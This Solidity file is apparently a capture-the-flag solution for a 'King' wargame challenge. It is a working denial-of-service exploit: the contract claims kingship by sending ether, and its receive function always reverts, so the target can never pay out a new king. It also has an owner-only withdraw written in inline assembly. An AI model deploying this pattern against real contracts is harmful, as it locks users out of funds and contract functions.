// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

contract KingExploit {
    address payable owner;

    constructor(address king) payable {
        // owner = payable(msg.sender);
        // (bool success, ) = king.call{ value: msg.value }("");
        // require(success);

        assembly {
            sstore(0, caller())

            let success := call(gas(), king, callvalue(), 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    // we could also just remove this function, which would revert the call on `transfer()`
    // but this way is more explicit for this challenge
    receive() external payable {
        assembly {
            revert(0, 0)
        }
    }

    function withdraw() public {
        // require(msg.sender == owner, "not owner");
        // (bool success, ) = msg.sender.call{ value: address(this).balance }("");
        // require(success);

        assembly {
            let msgSender := caller()

            // just for fun, let's revert with a string this time
            if iszero(eq(msgSender, sload(owner.slot))) {
                let ptr := mload(0x40)

                mstore(ptr, "Error(string)")
                mstore(ptr, keccak256(ptr, 13))

                mstore(add(ptr, 4), 0x20)
                mstore(add(add(ptr, 4), 0x20), 9)
                mstore(add(add(ptr, 4), 0x40), "not owner")
                revert(ptr, 0x64)
            }

            let success := call(gas(), msgSender, selfbalance(), 0, 0, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }
}
